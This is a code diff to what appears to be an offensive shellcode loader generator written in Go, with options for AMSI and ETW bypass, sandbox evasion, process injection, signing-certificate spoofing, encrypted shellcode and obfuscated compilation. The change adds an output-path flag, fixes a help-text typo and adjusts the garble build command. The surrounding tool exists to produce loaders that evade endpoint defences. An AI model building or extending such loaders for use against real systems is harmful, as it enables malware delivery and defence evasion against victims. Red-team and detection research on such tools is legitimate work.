@@ -36,6 +36,7 @@ type FlagOptions struct {
 	refresher        bool
 	sandbox          bool
 	sleep            bool
+	path             string
 }
 
 func options() *FlagOptions {
@@ -63,10 +64,11 @@ func options() *FlagOptions {
 	ProcessInjection := flag.String("injection", "", "Enables Process Injection Mode and specify the path to the process to create/inject into (use \\ for the path).")
 	configfile := flag.String("configfile", "", "The path to a json based configuration file to generate custom file attributes. This will not use the default ones.")
 	valid := flag.String("valid", "", "The path to a valid code signing cert. Used instead -domain if a valid code signing cert is desired.")
-	sandbox := flag.Bool("sandbox", false, `Enables sandbox evasion using IsDomainedJoined calls.`)
+	sandbox := flag.Bool("sandbox", false, `Enables sandbox evasion using IsDomainJoined calls.`)
 	sleep := flag.Bool("nosleep", false, `Disables the sleep delay before the loader unhooks and executes the shellcode.`)
+	path := flag.String("outpath", "", "The path to put the final Payload/Loader once it's compiled.")
 	flag.Parse()
-	return &FlagOptions{outFile: *outFile, inputFile: *inputFile, URL: *URL, LoaderType: *LoaderType, CommandLoader: *CommandLoader, domain: *domain, password: *password, configfile: *configfile, console: *console, AMSI: *AMSI, ETW: *ETW, Sha: *Sha, ProcessInjection: *ProcessInjection, refresher: *refresher, valid: *valid, sandbox: *sandbox, sleep: *sleep}
+	return &FlagOptions{outFile: *outFile, inputFile: *inputFile, URL: *URL, LoaderType: *LoaderType, CommandLoader: *CommandLoader, domain: *domain, password: *password, configfile: *configfile, console: *console, AMSI: *AMSI, ETW: *ETW, Sha: *Sha, ProcessInjection: *ProcessInjection, refresher: *refresher, valid: *valid, sandbox: *sandbox, sleep: *sleep, path: *path}
 }
 
 func execute(opt *FlagOptions, name string) string {
@@ -85,8 +87,7 @@ func execute(opt *FlagOptions, name string) string {
 		name = limelighter.FileProperties(name, opt.configfile)
 	}
 	if opt.LoaderType == "binary" {
-		cmd = exec.Command(bin, "GOOS=windows", "GOARCH=amd64", "GOFLAGS=-ldflags=-s", "GOFLAGS=-ldflags=-w", "../.lib/garble", "-seed=random", "build", "-a", "-trimpath", "-ldflags", "-w -s -buildid=", "-o", ""+name+".exe")
-
+		cmd = exec.Command(bin, "GOPRIVATE=*", "GOOS=windows", "GOARCH=amd64", "GOFLAGS=-ldflags=-s", "GOFLAGS=-ldflags=-w", "../.lib/garble", "-seed=random", "build", "-a", "-trimpath", "-ldflags", "-w -s -buildid=", "-o", ""+name+".exe")
 	} else {
 		cwd, err := os.Getwd()
 		if err != nil {
@@ -220,6 +221,6 @@ func main() {
 	fmt.Println("[+] Shellcode Encrypted")
 	name, filename := Loader.CompileFile(b64ciphertext, b64key, b64iv, opt.LoaderType, opt.outFile, opt.refresher, opt.console, opt.sandbox, opt.ETW, opt.ProcessInjection, opt.sleep, opt.AMSI)
 	name = execute(opt, name)
-	Loader.CompileLoader(opt.LoaderType, opt.outFile, filename, name, opt.CommandLoader, opt.URL, opt.sandbox, opt.Sha)
+	Loader.CompileLoader(opt.LoaderType, opt.outFile, filename, name, opt.CommandLoader, opt.URL, opt.sandbox, opt.Sha, opt.path)
 
 }
